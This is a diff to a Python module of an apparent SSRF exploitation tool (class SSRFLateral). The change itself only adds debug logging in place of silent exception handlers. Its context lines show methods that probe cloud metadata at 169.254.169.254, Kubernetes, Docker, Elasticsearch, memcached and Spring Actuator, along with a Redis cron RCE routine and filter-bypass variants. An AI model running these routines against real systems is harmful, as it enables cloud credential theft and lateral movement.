@@ -2,6 +2,10 @@ import json, re
 from typing import Optional, Dict, List
 import requests
 
+from tools.log_utils import get_logger
+
+logger = get_logger("ssrf_lateral")
+
 CLOUD_META = {
     "aws": [
         "http://169.254.169.254/latest/meta-data/",
@@ -70,8 +74,8 @@ class SSRFLateral:
                 if r.status_code not in (502, 504, 0) and len(r.text) > 10:
                     results.append({"port": port, "service": target,
                                     "status": r.status_code, "size": len(r.text)})
-            except:
-                pass
+            except Exception as e:
+                logger.debug("port_scan port %d: %s", port, e)
         return results
 
     def exploit_aws_imdsv2(self, url: str, param: str) -> Dict:
@@ -92,10 +96,10 @@ class SSRFLateral:
                                           timeout=self.timeout, verify=False)
                         if r.status_code == 200 and len(r.text) > 20:
                             result[meta_url[:40]] = r.text[:200]
-                    except:
-                        pass
-        except:
-            pass
+                    except Exception as e:
+                        logger.debug("imdsv2 inner %s: %s", meta_url[:30], e)
+        except Exception as e:
+            logger.debug("imdsv2 outer: %s", e)
         return result
 
     def exploit_kubernetes(self, url: str, param: str) -> Dict:
@@ -114,8 +118,8 @@ class SSRFLateral:
                                   timeout=self.timeout, verify=False)
                 if r.status_code in (200, 403) and len(r.text) > 50:
                     result[k8s_url] = {"status": r.status_code, "size": len(r.text)}
-            except:
-                pass
+            except Exception as e:
+                logger.debug("k8s %s: %s", k8s_url, e)
         return result
 
     def exploit_docker(self, url: str, param: str) -> Dict:
@@ -134,8 +138,8 @@ class SSRFLateral:
                                   timeout=self.timeout, verify=False)
                 if r.status_code == 200 and len(r.text) > 20:
                     result[dkr_url] = {"status": r.status_code, "size": len(r.text)}
-            except:
-                pass
+            except Exception as e:
+                logger.debug("docker %s: %s", dkr_url, e)
         return result
 
     def exploit_elasticsearch(self, url: str, param: str) -> Dict:
@@ -154,10 +158,11 @@ class SSRFLateral:
                     try:
                         j = r.json()
                         result[es_url] = list(j.keys())[:5] if isinstance(j, dict) else "json"
-                    except:
+                    except Exception as e:
+                        logger.debug("es json %s: %s", es_url, e)
                         result[es_url] = r.text[:100]
-            except:
-                pass
+            except Exception as e:
+                logger.debug("es %s: %s", es_url, e)
         return result
 
     def exploit_memcached(self, url: str, param: str) -> Dict:
@@ -169,8 +174,8 @@ class SSRFLateral:
                               timeout=self.timeout, verify=False)
             if len(r.text) > 10:
                 result["memcached"] = r.text[:200]
-        except:
-            pass
+        except Exception as e:
+            logger.debug("memcached: %s", e)
         return result
 
     def exploit_redis_cron_rce(self, url: str, param: str,
@@ -205,8 +210,8 @@ class SSRFLateral:
                               timeout=self.timeout, verify=False)
             if len(r.text) > 10:
                 result["mysql_probe"] = r.text[:200]
-        except:
-            pass
+        except Exception as e:
+            logger.debug("mysql ssrf: %s", e)
         return result
 
     def exploit_spring_actuator(self, url: str, param: str) -> Dict:
@@ -225,8 +230,8 @@ class SSRFLateral:
                                   timeout=self.timeout, verify=False)
                 if r.status_code == 200 and len(r.text) > 20:
                     result[sp] = r.text[:100]
-            except:
-                pass
+            except Exception as e:
+                logger.debug("spring %s: %s", sp, e)
         return result
 
     def bypass_filter_variants(self, url: str, param: str) -> List[Dict]:
@@ -239,8 +244,8 @@ class SSRFLateral:
                                   timeout=self.timeout, verify=False)
                 if len(r.text) > 50:
                     results.append({"variant": ip, "size": len(r.text)})
-            except:
-                pass
+            except Exception as e:
+                logger.debug("bypass variant %s: %s", ip, e)
         return results
 
     def run(self, url: str, param: str, sess=None, timeout: float = 10.0) -> Dict:
@@ -265,8 +270,8 @@ class SSRFLateral:
                         if cloud not in result["cloud_metadata"]:
                             result["cloud_metadata"][cloud] = {}
                         result["cloud_metadata"][cloud][meta_url[:50]] = r.text[:200]
-                except:
-                    pass
+                except Exception as e:
+                    logger.debug("cloud meta %s: %s", meta_url[:40], e)
         return result
 
 
